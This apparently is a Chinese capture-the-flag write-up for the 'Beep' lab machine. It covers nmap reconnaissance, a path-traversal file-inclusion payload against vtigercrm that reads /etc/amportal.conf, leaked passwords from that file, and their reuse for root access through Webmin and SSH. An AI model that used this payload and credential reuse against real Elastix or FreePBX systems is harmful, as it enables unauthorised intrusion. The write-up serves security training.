![image-20220412232633253](https://raw.githubusercontent.com/huamang/image/master/image-20220412232633253.png)

nmap扫描端口号，发现开启了很多端口

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://localhost/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: PIPELINING TOP RESP-CODES IMPLEMENTATION(Cyrus POP3 server v2) USER UIDL AUTH-RESP-CODE STLS EXPIRE(NEVER) LOGIN-DELAY(0) APOP
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: STARTTLS BINARY MULTIAPPEND X-NETSCAPE OK CHILDREN ACL LISTEXT UIDPLUS IMAP4rev1 ATOMIC URLAUTHA0001 LITERAL+ Completed RIGHTS=kxte NO LIST-SUBSCRIBED NAMESPACE ID SORT=MODSEQ QUOTA ANNOTATEMORE CONDSTORE CATENATE THREAD=REFERENCES RENAME MAILBOX-REFERRALS UNSELECT IMAP4 SORT THREAD=ORDEREDSUBJECT IDLE
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2022-04-12T17:13:37+00:00; +1s from scanner time.
878/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

主要关注了这几个：80、443、3306、10000

首先看80端口，和443是同一个，是一个这样的登录界面，Elastix

![image-20220413012325164](https://raw.githubusercontent.com/huamang/image/master/image-20220413012325164.png)

10000端口是这个服务，webmin

![image-20220413012532852](https://raw.githubusercontent.com/huamang/image/master/image-20220413012532852.png)

先看第一个，这里有一个admin路由

![image-20220413113255517](https://raw.githubusercontent.com/huamang/image/master/image-20220413113255517.png)

看一下这个系统有什么漏洞，关注到他这里有个文件包含漏洞

![image-20220413113452822](https://raw.githubusercontent.com/huamang/image/master/image-20220413113452822.png)

使用payload，读取到配置文件

![image-20220413115955305](../../../Library/Application%20Support/typora-user-images/image-20220413115955305.png)

```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

![image-20220413115857924](https://raw.githubusercontent.com/huamang/image/master/image-20220413115857924.png)

找到如下的比较敏感的信息

```php
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

...

#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE

...

# This is the default admin name used to allow an administrator to login to ARI bypassing all security.
# Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
ARI_ADMIN_USERNAME=admin

# This is the default admin password to allow an administrator to login to ARI bypassing all security.
# Change this to a secure password.
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
```

测试到，后台密码为admin:jEhdIekWmdjE

![image-20220413192258084](https://raw.githubusercontent.com/huamang/image/master/image-20220413192258084.png)

# 解法1

再测试到，webmin的账号密码为：root:jEhdIekWmdjE

![image-20220413192557059](https://raw.githubusercontent.com/huamang/image/master/image-20220413192557059.png)

这里有很多模块，发现有个文件下载和上传的服务模块，尝试下载一个/etc/passwd

可以看到是成功下载到了的

![image-20220413193010203](https://raw.githubusercontent.com/huamang/image/master/image-20220413193010203.png)

最后一个用户是fanis，猜测user.txt在里面，直接下载，成功拿下

![image-20220413193158298](https://raw.githubusercontent.com/huamang/image/master/image-20220413193158298.png)

惊喜的发现竟然是root权限

![image-20220413193245728](https://raw.githubusercontent.com/huamang/image/master/image-20220413193245728.png)

# 解法2

![image-20220413194111839](https://raw.githubusercontent.com/huamang/image/master/image-20220413194111839.png)

然后ssh登录root用户

```
root@kali# ssh root@10.10.10.7
root@10.10.10.7's password:
Last login: Fri Aug 25 18:05:54 2017

Welcome to Elastix
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]#
```

# 解法3

通过443端口攻击

```
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution
```

这里看了网上文章，是可以打通的，可以看[这个文章](https://0xdf.gitlab.io/2021/02/23/htb-beep.html#rce-via-18650py-path-1)